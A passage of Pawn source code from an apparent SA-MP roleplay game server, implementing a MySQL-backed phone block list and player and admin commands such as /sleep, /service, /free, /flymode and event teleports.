							    BlockPhone[playerid][bpNumar4] = 1;

							    new var[256];
	                            mysql_format(SQL, var, sizeof(var), "UPDATE `blocklist` SET `Nume4`='%s', `Numar4`='%d' WHERE `Name`='%s'",playername, BlockPhone[playerid][bpNumar4],playername3);
								mysql_tquery(SQL,var,"","");
							}
							else if(BlockPhone[playerid][bpNumar5] == 0)
							{
							    format(string, sizeof(string), "* You added the %s in CloudPhone the Block. To unlock write command [/unblock].", playername);
								SCM(playerid, COLOR_LIGHTBLUE, string);
							    BlockPhone[playerid][bpNumar5] = 1;

							    new var[256];
	                            mysql_format(SQL, var, sizeof(var), "UPDATE `blocklist` SET `Nume5`='%s', `Numar5`='%d' WHERE `Name`='%s'",playername, BlockPhone[playerid][bpNumar5],playername3);
								mysql_tquery(SQL,var,"","");
							}
							else if(BlockPhone[playerid][bpNumar6] == 0)
							{
							    format(string, sizeof(string), "* You added the %s in CloudPhone the Block. To unlock write command [/unblock].", playername);
								SCM(playerid, COLOR_LIGHTBLUE, string);
							    BlockPhone[playerid][bpNumar6] = 1;

							    new var[256];
	                            mysql_format(SQL, var, sizeof(var), "UPDATE `blocklist` SET `Nume6`='%s', `Numar6`='%d' WHERE `Name`='%s'",playername, BlockPhone[playerid][bpNumar6],playername3);
								mysql_tquery(SQL,var,"","");
							}
							else if(BlockPhone[playerid][bpNumar7] == 0)
							{
							    format(string, sizeof(string), "* You added the %s in CloudPhone the Block. To unlock write command [/unblock].", playername);
								SCM(playerid, COLOR_LIGHTBLUE, string);
							    BlockPhone[playerid][bpNumar7] = 1;

							    new var[256];
	                            mysql_format(SQL, var, sizeof(var), "UPDATE `blocklist` SET `Nume7`='%s', `Numar7`='%d' WHERE `Name`='%s'",playername, BlockPhone[playerid][bpNumar7],playername3);
								mysql_tquery(SQL,var,"","");
							}
							else if(BlockPhone[playerid][bpNumar8] == 0)
							{
							    format(string, sizeof(string), "* You added the %s in CloudPhone the Block. To unlock write command [/unblock].", playername);
								SCM(playerid, COLOR_LIGHTBLUE, string);
							    BlockPhone[playerid][bpNumar8] = 1;

							    new var[256];
	                            mysql_format(SQL, var, sizeof(var), "UPDATE `blocklist` SET `Nume8`='%s', `Numar8`='%d' WHERE `Name`='%s'",playername, BlockPhone[playerid][bpNumar8],playername3);
								mysql_tquery(SQL,var,"","");
							}
							else if(BlockPhone[playerid][bpNumar9] == 0)
							{
							    format(string, sizeof(string), "* You added the %s in CloudPhone the Block. To unlock write command [/unblock]].", playername);
								SCM(playerid, COLOR_LIGHTBLUE, string);
							    BlockPhone[playerid][bpNumar9] = 1;

							    new var[256];
	                            mysql_format(SQL, var, sizeof(var), "UPDATE `blocklist` SET `Nume9`='%s', `Numar9`='%d' WHERE `Name`='%s'",playername, BlockPhone[playerid][bpNumar9],playername3);
								mysql_tquery(SQL,var,"","");
							}
							else if(BlockPhone[playerid][bpNumar10] == 0)
							{
							    format(string, sizeof(string), "* You added the %s in CloudPhone the Block. To unlock write command [/unblock].", playername);
								SCM(playerid, COLOR_LIGHTBLUE, string);
							    BlockPhone[playerid][bpNumar10] = 1;

							    new var[256];
	                            mysql_format(SQL, var, sizeof(var), "UPDATE `blocklist` SET `Nume10`='%s', `Numar10`='%d' WHERE `Name`='%s'",playername, BlockPhone[playerid][bpNumar10],playername3);
								mysql_tquery(SQL,var,"","");
							}
							else
							{
							    SCM(playerid, COLOR_RED, "CloudPhone is full! Write [/unblock].");
							}
						}
						else return SCM(playerid, COLOR_SERVER, "{C1F589}Error: Acest player este deja blocat!");
					}
					else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
				}
			    else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
			}
		}
		else
		{
		    new Str[200],
				qstr[256];
			mysql_format(SQL,Str,sizeof(Str),"INSERT INTO `blocklist` (`Name`) VALUES ('%s')",playername3);
			mysql_tquery(SQL,Str,"","");
		    format(qstr,100,"SELECT * FROM blocklist WHERE `Name`='%s'",playername3);
		    //new Cache: pass = mysql_query(SQL,qstr);
		    if(cache_get_row_count() > 0)
		    {
				cache_get_field_content(0, "Name", BlockPhone[playerid][bpName], SQL, 130);
                BlockPhone[playerid][bpNumar1] = cache_get_field_content_int(0, "Numar1");
                BlockPhone[playerid][bpNumar2] = cache_get_field_content_int(0, "Numar2");
                BlockPhone[playerid][bpNumar3] = cache_get_field_content_int(0, "Numar3");
                BlockPhone[playerid][bpNumar4] = cache_get_field_content_int(0, "Numar4");
                BlockPhone[playerid][bpNumar5] = cache_get_field_content_int(0, "Numar5");
                BlockPhone[playerid][bpNumar6] = cache_get_field_content_int(0, "Numar6");
                BlockPhone[playerid][bpNumar7] = cache_get_field_content_int(0, "Numar7");
                BlockPhone[playerid][bpNumar8] = cache_get_field_content_int(0, "Numar8");
                BlockPhone[playerid][bpNumar9] = cache_get_field_content_int(0, "Numar9");
                BlockPhone[playerid][bpNumar10] = cache_get_field_content_int(0, "Numar10");
				cache_get_field_content(0, "Nume1", BlockPhone[playerid][bpNume1], SQL, 130);
				cache_get_field_content(0, "Nume2", BlockPhone[playerid][bpNume2], SQL, 130);
				cache_get_field_content(0, "Nume3", BlockPhone[playerid][bpNume3], SQL, 130);
				cache_get_field_content(0, "Nume4", BlockPhone[playerid][bpNume4], SQL, 130);
				cache_get_field_content(0, "Nume5", BlockPhone[playerid][bpNume5], SQL, 130);
				cache_get_field_content(0, "Nume6", BlockPhone[playerid][bpNume6], SQL, 130);
				cache_get_field_content(0, "Nume7", BlockPhone[playerid][bpNume7], SQL, 130);
				cache_get_field_content(0, "Nume8", BlockPhone[playerid][bpNume8], SQL, 130);
				cache_get_field_content(0, "Nume9", BlockPhone[playerid][bpNume9], SQL, 130);
				cache_get_field_content(0, "Nume10", BlockPhone[playerid][bpNume10], SQL, 130);

				strmid(BlockPhone[playerid][bpNume1], "Liber", 0, strlen("Liber"), 999);
				strmid(BlockPhone[playerid][bpNume2], "Liber", 0, strlen("Liber"), 999);
				strmid(BlockPhone[playerid][bpNume3], "Liber", 0, strlen("Liber"), 999);
				strmid(BlockPhone[playerid][bpNume4], "Liber", 0, strlen("Liber"), 999);
				strmid(BlockPhone[playerid][bpNume5], "Liber", 0, strlen("Liber"), 999);
				strmid(BlockPhone[playerid][bpNume6], "Liber", 0, strlen("Liber"), 999);
				strmid(BlockPhone[playerid][bpNume7], "Liber", 0, strlen("Liber"), 999);
				strmid(BlockPhone[playerid][bpNume8], "Liber", 0, strlen("Liber"), 999);
				strmid(BlockPhone[playerid][bpNume9], "Liber", 0, strlen("Liber"), 999);
				strmid(BlockPhone[playerid][bpNume10], "Liber", 0, strlen("Liber"), 999);
			}
			SCM(playerid, COLOR_YELLOW2, "CloudPhone deschis cu succes! Acum poti folosi comanda [/pblock].");
			PlayerInfo[playerid][pPhoneBlock] = 1;

			new var[512];
			mysql_format(SQL, var, sizeof(var), "UPDATE `blocklist` SET `Nume1`='%s', `Nume2`='%s', `Nume3`='%s', `Nume4`='%s',`Nume5`='%s' WHERE `Name`='%s'",BlockPhone[playerid][bpNume1], BlockPhone[playerid][bpNume2], BlockPhone[playerid][bpNume3], BlockPhone[playerid][bpNume4], BlockPhone[playerid][bpNume5],playername3);
			mysql_tquery(SQL,var,"","");
			mysql_format(SQL, var, sizeof(var), "UPDATE `blocklist` SET `Nume6`='%s',`Nume7`='%s',`Nume8`='%s',`Nume9`='%s',`Nume10`='%s' WHERE `Name`='%s'",BlockPhone[playerid][bpNume6],BlockPhone[playerid][bpNume7], BlockPhone[playerid][bpNume8], BlockPhone[playerid][bpNume9], BlockPhone[playerid][bpNume10],playername3);
			mysql_tquery(SQL,var,"","");
   			mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `PhoneBlock`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPhoneBlock],playername3);
			mysql_tquery(SQL,var,"","");

		}
	}
	return 1;
}
CMD:sleep(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(InHouse[playerid] > 0)
    {
        if(PlayerInfo[playerid][pWantedLevel] == 0)
		{
            if(PlayerInfo[playerid][pSleeping] == 0)
			{
   				PlayerInfo[playerid][pSleeping] = 1;
				TogglePlayerControllable(playerid,0);
     			SendClientMessage(playerid, COLOR_SERVER, "Now you can stay AFK without kicked. Use /sleep again when you come back into play.");
				SendClientMessage(playerid, COLOR_SERVER, "Minimizing the game (Alt-Tab) can cause some bugs. It is recommended to minimize press ESC before game.");
                LoopingAnim(playerid, "CRACK", "crckdeth2", 4.0, 1, 0, 0, 0, 0);
				SetPlayerColor(playerid,COLOR_GRAD2);
				DestroyPVehs(playerid);
				SetPlayerArmourEx(playerid, 100);
				SetPlayerHealthEx(playerid, 100);
			}
			else
			{
				PlayerInfo[playerid][pSleeping] = 0;
				TogglePlayerControllable(playerid,1);
				ClearAnimations(playerid);
                SendClientMessage(playerid, COLOR_SERVER, "Bine ai revenit!");
				SetPlayerToTeamColor(playerid);
				SetPlayerArmourEx(playerid, 0);
				SetPlayerHealthEx(playerid, 100);
		    }
        }
        else
		{
            SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You can not sleep, because you have wanted.");
			return 1;
        }
    }
    else return SendClientMessage(playerid, COLOR_SERVER, "You're in a house. You can sleep just in case.");
	return 1;
}
CMD:fixveh(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	    if(PlayerInfo[playerid][pAdmin] < 2) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		{
    		if(IsPlayerInAnyVehicle(playerid))
		    {
			    RepairVehicle(GetPlayerVehicleID(playerid));
			    Gas[GetPlayerVehicleID(playerid)] = 100;
			    SendClientMessage(playerid, COLOR_SERVER, "Car was repaired successfully.");
		    }
		}
	}
	return 1;
}
CMD:jetpack(playerid, params[])
{
	    if(IsPlayerConnected(playerid))
	    {
			if(PlayerInfo[playerid][pAdmin] >= 2)
			{
                SetPlayerSpecialAction(playerid, 2);
			}
			else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
		return 1;
}
CMD:flymode(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
	    if(PlayerInfo[playerid][pAdmin] >= 1)
		{
			new sendername[30],string[256];
		    if(flymode[playerid] == 0)
		    {
		        GetPlayerName(playerid, sendername, sizeof(sendername));
	            flymode[playerid] = 1;
	    		format(string,sizeof(string),"%s is now in flymode.", sendername);
				InitFly(playerid);
				StartFly(playerid);
				SetPlayerHealth(playerid, 500000.0);
			}
			else
			{
			    GetPlayerName(playerid, sendername, sizeof(sendername));
                flymode[playerid] = 0;
	    		format(string,sizeof(string),"%s has stopped flymode.", sendername);
				StopFly(playerid);
				SetPlayerHealth(playerid, 100);
			}
			ABroadCast(COLOR_YELLOW,string,1);
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:nos(playerid, params[])
{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] >= 2)
			{
				if(IsPlayerInAnyVehicle(playerid))
				{
					AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
					SendClientMessage(playerid, COLOR_SERVER, "Vehicle nos added!");
				}
			}
			else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
		return 1;
}
CMD:vnos(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(PlayerInfo[playerid][pVip] >= 1)
		{
			if(racingcar[playerid] >= 0) return SCM(playerid, COLOR_ERROR, "You can use this command now.");
			if(IsPlayerInRangeOfPoint(playerid, BLRaza, BLXYZ[0], BLXYZ[1], BLXYZ[2])) return SCM(playerid, COLOR_ERROR, "You can not use this command because you are in a restricted area of an admin.");
			if(IsPlayerInAnyVehicle(playerid))
			{
				AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
				SendClientMessage(playerid, COLOR_ORANGE, "VIP: {FFFFFF}Installed N20 (nos) vehicle.");
			}
		}
		else return SendClientMessage(playerid, COLOR_ERROR, "Your account is not a VIP.");
	}
	return 1;
}
CMD:service(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new x_nr[256],string[300],sendername[30];
		if(sscanf(params, "s[256]",x_nr))
		{
			SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/service <Name>");
		  	SendClientMessage(playerid, COLOR_SERVER, "Available names:{B8DBFF} Taxi, Medic, Mechanic, Pizza");
			return 1;
		}
		if(strcmp(x_nr,"taxi",true) == 0)
		{
			if(TaxiDrivers < 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}There are no Taxi Drivers On Duty at the moment, try again later.");
		    if(TransportDuty[playerid] > 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You can't call for a Taxi now.");
		    GetPlayerName(playerid, sendername, sizeof(sendername));
            if(IsPlayerInArea(playerid, -2997.40, -1115.50, -1213.90, 1659.60))
            {
				format(string, sizeof(string), "{B8FFDB}** %s is in need of a Taxi Driver, Location: %s (SF). (use /accept taxi %d to accept the call)", sendername ,GetPlayerZone(playerid),playerid);
		    	SendFamilyMessage(13, COLOR_SERVER, string);
			}
			if(IsPlayerInArea(playerid, 44.60, -2892.90, 2997.00, -768.00))
            {
				format(string, sizeof(string), "{B8FFDB}** %s is in need of a Taxi Driver, Location: %s (LS). (use /accept taxi %d to accept the call)", sendername ,GetPlayerZone(playerid),playerid);
		    	SendFamilyMessage(13, COLOR_SERVER, string);
			}
			if(IsPlayerInArea(playerid, 869.40, 596.30, 2997.00, 2993.80))
            {
				format(string, sizeof(string), "{B8FFDB}** %s is in need of a Taxi Driver, Location: %s (LV). (use /accept taxi %d to accept the call)", sendername ,GetPlayerZone(playerid),playerid);
		    	SendFamilyMessage(13, COLOR_SERVER, string);
			}
		    SendClientMessage(playerid, COLOR_SERVER, "{3385FF}* You have called for a Taxi Driver, wait for a reply.");
		    TaxiCall[playerid] = playerid;
		    return 1;
		}
		else if(strcmp(x_nr,"medic",true) == 0)
		{
		    GetPlayerName(playerid, sendername, sizeof(sendername));
            if(IsPlayerInArea(playerid, -2997.40, -1115.50, -1213.90, 1659.60))
            {
				format(string, sizeof(string), "{B8FFDB}** %s is in need of a Medic, Location: %s (SF). (use /accept medic %d to accept the call)", sendername,GetPlayerZone(playerid),playerid);
		    	SendFamilyMessage(14, COLOR_SERVER, string);
			}
			if(IsPlayerInArea(playerid, 44.60, -2892.90, 2997.00, -768.00))
            {
				format(string, sizeof(string), "{B8FFDB}** %s is in need of a Medic, Location: %s (LS). (use /accept medic %d to accept the call)", sendername,GetPlayerZone(playerid),playerid);
		    	SendFamilyMessage(14, COLOR_SERVER, string);
			}
			if(IsPlayerInArea(playerid, 869.40, 596.30, 2997.00, 2993.80))
            {
				format(string, sizeof(string), "{B8FFDB}** %s is in need of a Medic, Location: %s (LV). (use /accept medic %d to accept the call)", sendername,GetPlayerZone(playerid),playerid);
		    	SendFamilyMessage(14, COLOR_SERVER, string);
			}
		    SendClientMessage(playerid, COLOR_SERVER, "{3385FF}* You have called for a Medic, wait for a reply.");
		    MedicCall[playerid] = playerid;
		    return 1;
		}
		else if(strcmp(x_nr,"mechanic",true) == 0)
		{
			if(Mechanics < 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}There are no Car Mechanics On Duty at the moment, try again later.");
		    GetPlayerName(playerid, sendername, sizeof(sendername));
            if(IsPlayerInArea(playerid, -2997.40, -1115.50, -1213.90, 1659.60))
            {
				format(string, sizeof(string), "{B8FFDB}** %s is in need of a Car Mechanic, Location: %s (SF). (use /accept mechanic %d to accept the call)", sendername,GetPlayerZone(playerid),playerid);
		    	SendJobMessage(8, COLOR_SERVER, string);
			}
			if(IsPlayerInArea(playerid, 44.60, -2892.90, 2997.00, -768.00))
            {
				format(string, sizeof(string), "{B8FFDB}** %s is in need of a Car Mechanic, Location: %s (LS). (use /accept mechanic %d to accept the call)", sendername,GetPlayerZone(playerid),playerid);
		    	SendJobMessage(8, COLOR_SERVER, string);
			}
			if(IsPlayerInArea(playerid, 869.40, 596.30, 2997.00, 2993.80))
            {
				format(string, sizeof(string), "{B8FFDB}** %s is in need of a Car Mechanic, Location: %s (LV). (use /accept mechanic %d to accept the call)", sendername,GetPlayerZone(playerid),playerid);
		    	SendJobMessage(8, COLOR_SERVER, string);
			}
		    SendClientMessage(playerid, COLOR_SERVER, "{3385FF}* You have called for a Car Mechanic, wait for a reply.");
		    MechanicCall[playerid] = playerid;
		    return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_SERVER, "Available names:{B8DBFF} Taxi, Medic, Mechanic, Pizza");
			return 1;
		}
	}
	return 1;
}
CMD:free(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		new id,moneyfree,giveplayer[30],sendername[30],string[200];
		if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a cop.");
		if(sscanf(params, "ui", id,moneyfree)) return SendClientMessage(playerid, 0xFFFFFFFF,"{A9C4E4}Usage: {FFFFFF}/free <Name/Playerid> <Amount of Money>");
		if(PlayerInfo[id][pJailed] < 1) return SCM(playerid,COLOR_SERVER, "{FFB870}The player is not in jail.");
		if(PlayerInfo[id][pJailed] == 2) return SCM(playerid,COLOR_SERVER,"{FFB870}This player have admin jail.");
		if(playerid == id) return SCM(playerid,COLOR_SERVER,"{FFB870}Please chose another player.");
		if(TimerFree[playerid] >=1) return SCM(playerid,COLOR_SERVER,"{FFB870}You already offered a free, please wait 20 seconds to give another free.");
		if(PlayerInfo[playerid][pRob] < 3) return SCM(playerid, COLOR_SERVER, "{FFB870}Ai nevoie de minim 3 puncte rob pentru a putea oferi free.");
		if(moneyfree < 10000 || moneyfree > 300000) return SCM(playerid,COLOR_SERVER,"{FFB870}Invalid amount of money($10,000-$300,000).");
		if(ProxDetectorS(10.0, playerid, id))
		{
            if(IsPlayerConnected(id))
            {
                if(id != INVALID_PLAYER_ID)
                {
	 				FreeOffer[id] = playerid;
	 				FreePlayer[playerid] = id;
					FreePrice[id] = moneyfree;
					//timerfree1[playerid] = SetTimerEx("SetSomate1", 20000, 1, "i", playerid);
					//SetTimerEx("SetSomate1", 20000, 0, "i", playerid);
					freetimer[playerid] = 20;
					TimerFree[playerid] = 2;
	 				GetPlayerName(id, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, sizeof(string), "I have sent to %s an offer to be freed $%s.",giveplayer,FormatNumber(moneyfree));
					SendClientMessage(playerid, COLOR_ERROR, string);
					format(string, sizeof(string), "> %s wants to give you the opportunity to get out of jail in exchange for $%s. Write /accept free %d to accept.",sendername,FormatNumber(moneyfree),playerid);
					SendSplitMessage(id, COLOR_DBLUE, string);
				}
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SCM(playerid,COLOR_SERVER,"{FFB870}The player is not near you.");
	}
	return 1;
}
CMD:minlevel(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 5)
 	{
 	    new fid,maxmembers,string[MAX_STRING];
 	    if(sscanf(params, "dd",fid,maxmembers)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/minlevel <FactionID> <Level>");
 	    if(maxmembers > 2 && maxmembers <= 20)
 	    {
 	        if(fid > 0 && fid <= 14)
 	        {
 	        	DynamicFactions[fid][fMinLevel] = maxmembers;
 	        	mysql_format(SQL, string, sizeof(string), "UPDATE `factions` SET `MinLevel`='%d' WHERE `ID`='%d'",DynamicFactions[fid][fMinLevel], fid);
				mysql_tquery(SQL,string,"","");
				format(string, sizeof(string), "Now faction %s may invite members minimum level %d.",DynamicFactions[fid][fName], DynamicFactions[fid][fMinLevel]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "FactionID must be between 1 and 14.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "Level must be between 3 and 20.");
	}
	else
	{
 		SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:maxmembers(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 5)
 	{
 	    new fid,maxmembers,string[MAX_STRING];
 	    if(sscanf(params, "dd",fid,maxmembers)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/maxmembers <FactionID> <Members>");
 	    if(maxmembers > 4 && maxmembers <= 20)
 	    {
 	        if(fid > 0 && fid <= 14)
 	        {
 	        	DynamicFactions[fid][fMaxMembers] = maxmembers;
 	        	mysql_format(SQL, string, sizeof(string), "UPDATE `factions` SET `MaxMembers`='%d' WHERE `ID`='%d'",DynamicFactions[fid][fMaxMembers], fid);
				mysql_tquery(SQL,string,"","");
				format(string, sizeof(string), "Now faction %s It has the maximum number of %d members.",DynamicFactions[fid][fName], DynamicFactions[fid][fMaxMembers]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "FactionID must be between 1 and 14.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "Max members must be between 1 and 20.");
	}
	else
	{
 		SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:paydaymoney(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 5)
 	{
 	    new fid,money,string[MAX_STRING];
 	    if(sscanf(params, "dd",fid,money)) return SendClientMessage(playerid, 0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/paydaymoney <FactionID> <Money>");
 	    if(money > 0 && money <= 500000)
 	    {
 	        if(fid > 0 && fid <= 14)
 	        {
 	            DynamicFactions[fid][fPaydayMoney] = money;
 	            mysql_format(SQL, string, sizeof(string), "UPDATE `factions` SET `PaydayMoney`='%d' WHERE `ID`='%d'",DynamicFactions[fid][fPaydayMoney], fid);
				mysql_tquery(SQL,string,"","");
				format(string, sizeof(string), "Now faction %s receives $%s payday in safe.",DynamicFactions[fid][fName], FormatNumber(DynamicFactions[fid][fPaydayMoney]));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "FactionID must be between 1 and 14.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "Money must be between $1 and $500,000.");
    }
	else
	{
 		SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:placegotoevent(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 1)
 	{
 	    new Float:x, Float:y, Float:z, sendername[25], string[256];
     	GetPlayerName(playerid, sendername, sizeof(sendername));
		GetPlayerPos(playerid, x, y, z);
 	    if(!eventenabled)
	    {
   			pickup_event = CreatePickup(1314, 23, x, y, z, GetPlayerVirtualWorld(playerid));
   			evex = x;
   			evey = y;
   			evez = z;
   			eventenabled = 1;
   			interiorevent = GetPlayerInterior(playerid);
		   	virtuallevent = GetPlayerVirtualWorld(playerid);
   			dynamicevent3DText = CreateStreamed3DTextLabel("Event Teleport",COLOR_ERROR, x, y, z+0.25,8.0,GetPlayerVirtualWorld(playerid));
   			format(string, sizeof(string), "(( Info: Admin %s activated event teleport, type /gotoevent. ))", sendername);
			SendClientMessageToAll(COLOR_ERROR,string);
			return 1;
		}
		else
		{
			DestroyPickup(pickup_event);
			evex = 0.0;
			evey = 0.0;
			evez = 0.0;
			eventenabled = 0;
			interiorevent = 0;
			virtuallevent = 0;
			DestroyDynamic3DTextLabel(dynamicevent3DText);
			format(string, sizeof(string), "(( Info: Admin %s deactivated event teleport. ))", sendername);
			SendClientMessageToAll(COLOR_ERROR,string);
		}
		return 1;
	}
	else
	{
 		SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:gotoevent(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(PlayerInfo[playerid][pPaintBallG] > 0) return SendClientMessage(playerid, COLOR_SERVER, "You can't use this command at Paintball.");
	if(IsPlayerConnected(playerid))
	{
	    if(eventenabled)
	    {
	        SetPlayerInterior(playerid, interiorevent);
	        SetPlayerVirtualWorld(playerid, virtuallevent);
			SetPlayerPosEx(playerid, evex, evey, evez);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have been teleported at event.");
			ResetPlayerWeaponsEx(playerid);
 			ResetPlayerWeapons(playerid);
		}
		else return SendClientMessage(playerid, COLOR_ERROR, "No event teleport activated.");
	}
	return 1;
}
CMD:launchfw(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		if(PlayerInfo[playerid][pFWorks] > 0)
		{
			if(timp_artificie[playerid] == 0)
			{
				new string[128],sendername[30];
				PlayerInfo[playerid][pFWorks] -= 1;
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "* %s set fire to an artifice, remove yourself from it.", sendername);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				Update(playerid, pFWorksx);
				new eid = -1;
				new doarodata = 0;
				for(new i = 0; i < NRARTIFICI; i++) 
				{
					if(doarodata == 0) 
					{ 
						if(Artificie[i][Lansata] < 1) 
						{ eid = i; doarodata = 1; } 
					} 
				}
				if(eid < 0) return SCM(playerid, COLOR_ERROR, "set fire to an artifice, remove yourself from it.");
				GetPlayerPos(playerid,Artificie[eid][Artificie_Pozitie][0],Artificie[eid][Artificie_Pozitie][1],Artificie[eid][Artificie_Pozitie][2]);
				GetPlayerFacingAngle(playerid,Artificie[eid][Artificie_Pozitie][3]);
				Artificie[eid][Directie]=1;
				Artificie[eid][Lansata]=1;
				Artificie[eid][Artificie_Raza]=15;
				Artificie[eid][Artificie_Inaltime]=35;
				Artificie[eid][NRFocuri] = 15;
				Artificie[eid][Artificie_Pozitie][0]+= (2.0 * floatsin(-Artificie[eid][Artificie_Pozitie][3],degrees));
				Artificie[eid][Artificie_Pozitie][1]+= (2.0 * floatcos(-Artificie[eid][Artificie_Pozitie][3],degrees));
				Artificie[eid][Artificie_Pozitie][2]-=0.9;
				Artificie[eid][ObiectFum] = CreateObject(18728,Artificie[eid][Artificie_Pozitie][0],Artificie[eid][Artificie_Pozitie][1],Artificie[eid][Artificie_Pozitie][2], 0,0,0);
				Artificie[eid][Obiect] = CreateObject(3016,Artificie[eid][Artificie_Pozitie][0],Artificie[eid][Artificie_Pozitie][1],Artificie[eid][Artificie_Pozitie][2], 0,0,0);
				Artificie[eid][TimpLansare] = 350;
				timp_artificie[playerid] = 10;
				return 1;
			}
			else return SendClientMessage(playerid, COLOR_ERROR, "Please wait 10 seconds.");
        }
		else return SendClientMessage(playerid, COLOR_ERROR, "You have fireworks.");
	}
	return 1;
}
CMD:killcp(playerid, params[])
{
    if(CP[playerid] != 0)
 	{
  		DisablePlayerCheckpoint(playerid);
  		SendClientMessage(playerid,COLOR_SERVER,"You have disabled the checkpoint.");
  		CP[playerid] = 0;
 	}
    else if(UsedFind[playerid] == 1)
	{
		UsedFind[playerid] = 0;
		DisablePlayerCheckpoint(playerid);
		foreach(Player, i)
		{
			if(IsACop(playerid))
			{
   				if(caser[playerid] == i)
			    {
					cased[i] --;
					caser[playerid] = 1001;
				}
			}
		}
	}
	else if(BusinessRob[playerid] > 0)
	{
		SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
		return 1;
	}
 	else if(Trucker[playerid] >= 1)
 	{
   		ShowPlayerDialog(playerid, DIALOG_CANCELJOB, DIALOG_STYLE_MSGBOX, "Are you sure?", "Want to cancel current job?", "Yes", "Nu");
 	}
 	return 1;
}
CMD:cancel(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		new x_job[256],string[300];
		if(sscanf(params, "s[256]",x_job))
		{
			SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/cancel <Name>");
			SendClientMessage(playerid, COLOR_SERVER, "Available name: Drugs, Repair, Free, Live, House, Deal.");
			SendClientMessage(playerid, COLOR_SERVER, "Available name: Taxi, Medic, Mechanic, Ticket.");
			SendClientMessage(playerid, COLOR_SERVER, "Available name: Refill, Materials, Requestevent.");
			return 1;
		}
		if(strcmp(x_job,"requestevent",true) == 0)
		{
			if(requestingevent[playerid] == 0) return SendClientMessage(playerid, 0xFFFFFFFF, "{FFB870}You're not requesting an event.");
			requestingevent[playerid] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Your event request has been cancelled.");
		}
		else if(strcmp(x_job,"free",true) == 0)
		{
			if(FreeOffer[playerid] == -1) return SCM(playerid,COLOR_SERVER,"{FFB870}No one offered you a free.");
			FreeOffer[playerid] = -1;
			FreePrice[playerid] = 0;
		}
		else if(strcmp(x_job,"drugs",true) == 0)
		{
			if(DrugOffer[playerid] == 999) return SCM(playerid,COLOR_SERVER,"{FFB870}No one offered you drugs.");
			DrugOffer[playerid] = 999;
			DrugPrice[playerid] = 0;
			DrugGram[playerid] = 0;
		}
